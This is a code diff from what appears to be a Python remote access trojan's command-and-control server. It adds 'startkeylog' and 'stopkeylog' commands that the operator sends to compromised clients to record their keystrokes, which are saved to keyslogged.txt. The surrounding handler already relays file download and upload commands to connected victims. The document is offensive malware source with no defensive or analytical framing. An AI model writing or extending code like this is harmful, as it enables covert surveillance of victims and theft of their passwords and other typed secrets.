@@ -894,6 +894,7 @@ def handle_connection(s, conn, addr, session_num):
                         sessions[addr]['session_active'] = False
                         print()
                         break
+                        
                     elif command.lower().startswith("download"):
                         conn.send(command.encode())
                         parts = command.split(" ", 1)
@@ -907,6 +908,20 @@ def handle_connection(s, conn, addr, session_num):
                         filename = parts[1].strip()
                         # Call the send_file function to initiate the upload
                         send_file(conn, filename)
+                     
+                    elif command.lower().startswith("startkeylog"):
+                        print("[+] logging keystrokes")
+                        command += "\n"
+                        conn.send(command.encode())
+                        time.sleep(0.5)
+                        sys.stdout.flush()
+                        
+                    elif command.lower().startswith("stopkeylog"):
+                        print("[-] keylog halted see keyslogged.txt")
+                        command += "\n"
+                        conn.send(command.encode())
+                        time.sleep(0.5)
+                        sys.stdout.flush()
                         
                     else:
                         command += "\n"
